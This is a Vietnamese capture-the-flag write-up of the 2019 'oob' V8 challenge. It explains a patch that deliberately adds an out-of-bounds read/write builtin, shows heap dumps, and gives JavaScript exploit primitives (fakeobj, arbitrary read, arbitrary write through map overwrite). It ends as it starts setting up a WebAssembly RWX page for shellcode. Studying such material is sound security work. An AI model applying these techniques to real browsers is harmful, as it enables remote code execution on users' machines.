# write up oob 2019
- bài sẽ cho chúng ta 1 file zip trong đó có chứa patch để build v8 engine từ source code
- chỉ cần tập trung vào file patch vì đây là code sẽ được thêm mới vào v8, file patch có tên là oob.diff
- trong file patch chứa 1 phần BUILTIN function được thêm vào
```cpp
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    uint32_t length = static_cast<uint32_t>(array->length()->Number());
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+    }else{
+        //write
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}
```
- tên hàm được đặt là oob và hàm sử dụng được với object được tạo kiểu array

 ```c
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
```
- ta có thể thấy khi len == 1 (len là số args được pass qua hàm oob), hàm sẽ return giá trị là phần tử thứ length của array,tức là length của array dược lấy làm index, tuy nhiên thực sự index của mảng n elements phải bắt đầu từ 0, và kết thúc là n-1, nhưng index là n nên bị out of bound
```cpp
    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
```
```cpp
float get_scalar() const { return bit_cast<float>(bit_pattern_); }
```
- object được lấy ra và sau đó truy xuất tới phần tử của index đó thông qua hàm get_scalar của class FixedDoubleArray, vì vậy giá trị trả về sẽ kiểu float
- hàm này chỉ là hàm handle lỗi và các thứ
```cpp
isolate->factory()->NewNumber()
```
- trong javascript, khi object JSArray được tạo ra thì sẽ có 4 fields như sau:
```cpp
d8> DebugPrint: 0x319e6328dd21: [JSArray]
 - map: 0x1aa7c7a42d99 <Map(PACKED_SMI_ELEMENTS)> [FastProperties]
 - prototype: 0x0da3038d1111 <JSArray[0]>
 - elements: 0x319e6328dcc1 <FixedArray[1]> [PACKED_SMI_ELEMENTS (COW)]
 - length: 1
 - properties: 0x3ecebe500c71 <FixedArray[0]> {
    #length: 0x1211409c01a9 <AccessorInfo> (const accessor descriptor)
 }
```
- JSArray có 1 cái là map object, map dùng để v8 engine có thể xác định được kiểu dữ liệu nào đang được sử dụng trong JSArray, elements, map có thể được thay đổi trong quá trình thay đổi dữ liệu trong JSArray, map khi bị thay đổi sẽ keep track map trước đó
- tiếp theo là elements, elements là object FixedArray
```cpp
d8> 0x334c86490661: [FixedArray]
 - map: 0x33f0d0f00851 <Map>
 - length: 1
           0: 0x33f0d0f3b7b9 <String[#1]: a>
$
```
```cpp
0x33f0d0f00851: [Map]
 - type: FIXED_ARRAY_TYPE
 - instance size: variable
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
...
```
- elements cũng được track bởi 1 map
- khi test có ta có thể thấy 1 điều đặc biệt ở array kiểu [object,object,object] hoặc [float,float,float] đó là element object sẽ nằm trên object của JSArray, điều này không xảy ra với [int,int,int]
- khi test thử 1 object với 3 elements kiểu float
```cpp
d8> [1.2, 1.2, 1.3]
$ %DebugPrint(a)
d8> DebugPrint: 0x334c86491d91: [JSArray]
 - map: 0x2b1b72382ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x13edc9f11111 <JSArray[0]>
 - elements: 0x334c86491d69 <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x33f0d0f00c71 <FixedArray[0]> {
    #length: 0x3fa4374001a9 <AccessorInfo> (const accessor descriptor)
 }
```
- có thể thấy rằng số elements là 3 ở địa chỉ có đuôi 1d70
- 3 phần tử chạy từ 1d78 đến 1d88
- ta có map của JSArray sẽ là phần tử thứ 4 tính theo mảng
```cpp
pwndbg> tel 0x334c86491d69-1
00:0000│  0x334c86491d68 —▸ 0x33f0d0f014f9 ◂— 0x33f0d0f001
01:0008│  0x334c86491d70 ◂— 0x300000000
02:0010│  0x334c86491d78 ◂— 0x3ff3333333333333
03:0018│  0x334c86491d80 ◂— 0x3ff3333333333333
04:0020│  0x334c86491d88 ◂— 0x3ff4cccccccccccd
05:0028│  0x334c86491d90 —▸ 0x2b1b72382ed9 ◂— 0x4000033f0d0f001
06:0030│  0x334c86491d98 —▸ 0x33f0d0f00c71 ◂— 0x33f0d0f008
07:0038│  0x334c86491da0 —▸ 0x334c86491d69 ◂— 0x33f0d0f014
pwndbg> 
08:0040│  0x334c86491da8 ◂— 0x300000000
```
- quay lại đây chính vì vậy ta có index mà là length thì sẽ là 3, bắt đầu từ index 0, ta sẽ in được địa chỉ của map dưới dạng float, ta có arb read
```cpp
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
```
- tiếp theo ta có arb write nếu len != 1 tại index = length, map sẽ bị ghi đè bằng giá trị mà chúng ta nhập vàoj
```
elements.set(length,value->Number());
```
```cpp
double Object::Number() const {
  DCHECK(IsNumber());
  return IsSmi() ? static_cast<double>(Smi(this->ptr())->value())
                 : HeapNumber::unchecked_cast(*this)->value();
}
```
- tùy theo kiểu mà sẽ trả về value theo kiểu đó, hàm value được định nghĩa trong class của kiểu dữ liệu
- khi có thể write map lúc này ta sẽ có thể control đc kiểu dữ liệu mà v8 sẽ sử dụng, với leak thì ta có địa chỉ của map, với write thì ta control map bằng cách như sau:
- ta có thể tận dụng map để fake 1 địa chỉ ghi vào kiểu float, thành 1 object JSArray, từ đó có thể leak dữ liệu ra,
- object sẽ được fake thông qua 1 JSArray khác bằng cách ghi dữ liệu vào như thông thường
 ```cpp
arb_rw_arr = [itof(flt_map),itof(0x0000000200000000n),1.2,itof((0x1n<<32n))] // only leak 1 addr
console.log("debug arb_rw_arr: ");%DebugPrint(arb_rw_arr)
function fakeobj(val){
  if(val % 2n==0){
    val +=1n
  }
  first = addrof(arb_rw_arr) - 0x20n
  arb_rw_arr[2] = itof(val-0x10n)
  flt[0] = itof(first)
  flt.oob(itof(obj_arr_map))
  result = flt[0]
  flt.oob(itof(flt_map))
  return result
```
- hàm addrof sử dụng để lấy điạ chỉ của 1 object, ta sẽ fake y chang như 1 elements nhưng địa chỉ trong elements phải -0x10n để nó rơi trúng địa chỉ mà ta cần leak hoặc write
- tiếp theo đó là ta sẽ lấy địa chỉ của phần element bắt đầu từ map, rồi ghi địa chỉ đó vào 1 JSArray khác, rồi sau đó ghi map là map của obj array để nó đọc địa chỉ đó thành 1 cái obj array, thay vì nó là 1 float, sau đó gán obj array đó vào 1 biến rồi return, như vậy là ta đã có được 1 fakeobj
- tiếp theo để leak địa chỉ nằm trong 1 địa chỉ khác, ta sẽ tạo 1 float array, gán fakeobj với địa chỉ fake element chứa 1 địa chỉ cần leak vào 1 phần tử của float array, sau đó ghi đè map thành map của obj array, sau đó lấy dữ liệu ra như cách 1 object  chứa trong 1 obj khác, rồi return về giá trị đó
```cpp
function ptrva(val){
  flt_arr = [1.1,2.2,3.3]
  flt_arr[0] = fakeobj(val)
  flt_arr.oob(origin)
  result = flt_arr[0][0]
  flt_arr.oob(itof(flt_map))
  return ftoi(result)
}
```
- giả sử ta có địa chỉ như này:  0x1ed0e780040 —▸ 0x55a651b8d128 , với hàm trên ta leak được 0x55a651b8d128
- tận dụng hàm để leak mọi thứ
- tiếp theo để khai thác arb write ta cũng viết 1 hàm sau đó fake 1 object rồi đè map như hàm trên, nhưng sau đó ta sẽ tận dụng hàm obb để ghi đè
```cpp
function wrivar(addr,val){
  flt_arr = [1.1,2.2,3.3]
  flt_arr[0] = fakeobj(addr-0x8n)
  flt_arr.oob(origin)
  flt_arr[0].oob(itof(val))
  flt_arr.oob(itof(flt_map))
}
```
- sau khi leak có được mọi thứ, ta sẽ tạo 1 page địa chỉ của webassembly để có rwx và ghi shellcode
```cpp
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
```
